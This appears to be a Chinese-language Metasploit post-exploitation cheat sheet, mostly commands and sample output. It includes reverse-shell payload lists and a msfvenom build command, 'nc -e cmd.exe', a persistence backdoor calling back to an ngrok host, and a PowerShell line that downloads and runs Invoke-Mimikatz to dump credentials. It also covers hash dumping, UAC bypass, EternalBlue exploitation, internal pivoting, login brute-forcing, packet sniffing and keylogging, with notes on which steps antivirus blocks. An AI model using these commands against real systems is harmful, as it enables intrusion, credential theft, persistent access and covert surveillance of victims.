linux相关payload：
        linux/x86/meterpreter/reverse_tcp
        linux/x86/meterpreter/bind_tcp
        linux/x86/shell_bind_tcp
        linux/x86/shell_reverse_tcp
        linux/x64/shell/bind_tcp
        linux/x64/shell/reverse_tcp
        linux/x64/shell_bind_tcp
        linux/x64/shell_bind_tcp_random_port
        linux/x64/shell_reverse_tcp
windows相关payload:
        windows/meterpreter/reverse_tcp
        windows/meterpreter/bind_tcp
        windows/meterpreter/reverse_hop_http
        windows/meterpreter/reverse_http
        windows/meterpreter/reverse_http_proxy_pstore
        windows/meterpreter/reverse_https
        windows/meterpreter/reverse_https_proxy
        windows/shell_reverse_tcp
        windows/shell_bind_tcp
        windows/x64/meterpreter/reverse_tcp
        windows/x64/meterpreter/bind_tcp
        windows/x64/shell_reverse_tcp
        windows/x64/shell_bind_tcp
目标服务器为64位用x64监听，反弹meterpreter用含有meterpreter的模块，反弹普通的shell（例如nc），shell_reverse_tcp模块监听
例如msf:
    反弹shell  msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe 
    监听       windows/meterpreter/reverse_tcp
    反弹shell  nc -e cmd.exe ip port 
    监听       windows/shell_reverse_tcp
meterpreter下上传 upload file 下载 download file
#### Msf进程注入(测试win10没成功,win2008 可以，360会拦)
    meterpreter > getuid
    Server username: xxxx
    meterpreter > getpid
    Current pid: 3456
    meterpreter > ps
    Process List
    ============
     PID   PPID  Name                       Arch  Session  User          Path
    ---   ----  ----                       ----  -------  ----          ----     12000  676  shell.exe                  x86   2        xxx  C:\Users\xxx\Desktop\shell.exe
     676  1124  explorer.exe               x64   2        xxx  C:\Windows\explorer.exe
    meterpreter > migrate 676
    [*] Migrating from 12000 to 676...
    [*] Migration completed successfully.
#### Msf hash
  1. meterpreter > run hashdump 需要sys权限 导出SAM
  2. meterpreter > run post/windows/gather/smart_hashdump 需要sys权限
  3. getsystem存在uac，用msf bypass，但特征明显 meterpreter > search bypassuac
  4. msf powerdump load mimikatz 不太好用
#### Msf的持续后门
Persistence: run persistence -h：用于创建启动项启动，会创建注册表，创建文件。（X86_Linux不支持此脚本）
    run persistence -U -i 10 -p 10390 -r free.ngrok.cc 
    会被360拦，-i 10 10秒请求一次
使用powershell执行也被监控而被360拦截
meterpreter 的 run getgui -e 命令可以开启成 功。360会提示阻止
Run metsvc -h ：用于创建服务，会创建meterpreter服务，并上传三个文件，使用-r参数可以卸载服务 ，被拦
#### Msf powershell
    meterpreter > load powershell
    meterpreter > powershell_shell
    PS > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
    Ps > Invoke-Mimikatz -DumpCreds
#### Msf Router
2个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器shell session 添加路由，使msf可以在当前shell
session下以被攻击机访问其他内网主机.
    meterpreter > run get_local_subnets 
        [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
        [!] Example: run post/multi/manage/autoroute OPTION=value [...]
        Local subnet: 172.17.0.0/255.255.0.0
    meterpreter > run autoroute -s 172.17.0.0/16  添加路由
    meterpreter > run autoroute -p                查看路由
    meterpreter > run autoroute -d -s 172.17.0.0/16  删除
MS17-010
    meterpreter > background 
    [*] Backgrounding session 1...
    msf exploit(multi/handler) > use auxiliary/scanner/smb/smb_ms17_010 
    msf auxiliary(scanner/smb/smb_ms17_010) > set rhosts 172.17.0.0/24
    rhosts => 172.17.0.0/24
    msf auxiliary(scanner/smb/smb_ms17_010) > set threads 50
    threads => 50
    msf auxiliary(scanner/smb/smb_ms17_010) > run
先利用exploit/windows/smb/ms17_010_psexec，win10旧版依旧可以，新版设置smbuser，smbpass即可
#### Msf扫描
经过上面设置路由即可使用以下scan：
    use auxiliary/scanner/portscan/syn
    use auxiliary/scanner/portscan/tcp
    常用port 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899
服务扫描:
    SMB版本识别：auxiliary/scanner/smb/smb_version 
    MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433
    SSH版本信息：auxiliary/scanner/ssh/ssh_version
    FTP版本识别：auxiliary/scanner/ftp/ftp_version
    HTTP服务：auxiliary/scanner/http/http_header 返回相关header信息
port：21 （FTP）
    auxiliary/scanner/ftp/ftp_login     //FTP登陆爆破
其它：search FTP。FTP常见利用方式，除了直接获取文件，还要注意目录跨越漏洞，成功利用，可以直接反弹shell
port:22 (SSH)
    auxiliary/scanner/ssh/ssh_login
其它：search SSH
port:23 (telnet)
    auxiliary/scanner/telnet/telnet_login    //主要目标是内网中的路由器，交换机等网络设备
port:445
    exploit/windows/smb/ms08_067_netapi         //上古漏洞，依然有惊喜
    exploit/windows/smb/ms17_010_eternalblue    //永恒之蓝
    auxiliary/scanner/smb/smb_login             //SMB登陆爆破
其它：search smb | Samba。linux下的CVE-2017-7494， 445 端口的远程利用
port:3389 (远程桌面RDP)
    auxiliary/scanner/rdp/ms12_020_check
5900 (VNC)
    auxiliary/scanner/vnc/vnc_none_auth
    auxiliary/scanner/vnc/vnc_login
    exploit/multi/vnc/vnc_keyboard_exec
数据库：
port:1433 （Sqlserver）
    use auxiliary/scanner/mssql/mssql_login
port:3306 (Mysql)
    auxiliary/scanner/mysql/mysql_login
port: 27017、27018 (Mongodb)
    auxiliary/scanner/mongodb/mongodb_login
port:6379 （Redis）
    auxiliary/scanner/redis/redis_login
    auxiliary/scanner/redis/file_upload
port:1521 (Oracle)
    search Oracle
port:5432 (PostgreSQL)
    search PostgreSQL
use auxiliary/server/socks4a  
proxychains设置socks4为上条设置的，即可在本地代理扫描, 目前msf已经支持 socks5 代理
### Msf端口转发portfwd
    portfwd add -L 0.0.0.0 4443 -p 3389 -r 192.168.2.100
将192.168.1.2.100内网转发到本地4443 port，流量大不好用
#### Msf截屏(没被360拦没提示，或许有意外收获)
    meterpreter > use espia
    meterpreter > screengrab
#### Msf嗅探
    meterpreter > use sniffer
    Loading extension sniffer...Success.
    meterpreter > help
    Sniffer Commands
    ================
        Command             Description
        -------             -----------        sniffer_dump        Retrieve captured packet data to PCAP file
        sniffer_interfaces  Enumerate all sniffable network interfaces
        sniffer_release     Free captured packets on a specific interface instead of downloading them
        sniffer_start       Start packet capture on a specific interface
        sniffer_stats       View statistics of an active capture
        sniffer_stop        Stop packet capture on a specific interface
    meterpreter > sniffer_interfaces
    1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
    2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
    3 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
    4 - 'Intel(R) PRO/1000 MT Network Connection' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
    5 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
    meterpreter > sniffer_start 5
    [*] Capture started on interface 5 (50000 packet buffer)
    meterpreter > sniffer_dump 5 /tmp/1.pcap
    [*] Flushing packet capture buffer for interface 5...
    [*] Flushed 2540 packets (1450560 bytes)
    [*] Downloaded 036% (524288/1450560)...
    [*] Downloaded 072% (1048576/1450560)...
    [*] Downloaded 100% (1450560/1450560)...
    [*] Download completed, converting to PCAP...
    [*] PCAP file written to /tmp/1.pcap
    meterpreter > sniffer_stop 5
    [*] Capture stopped on interface 5
    [*] There are 29 packets (2263 bytes) remaining
    [*] Download or release them using 'sniffer_dump' or 'sniffer_release'
#### 键盘记录
Msf键盘记录在win不会创建新进程
    meterpreter > keyscan_start 
    Starting the keystroke sniffer ...
    meterpreter > keyscan_dump 
    Dumping captured keystrokes...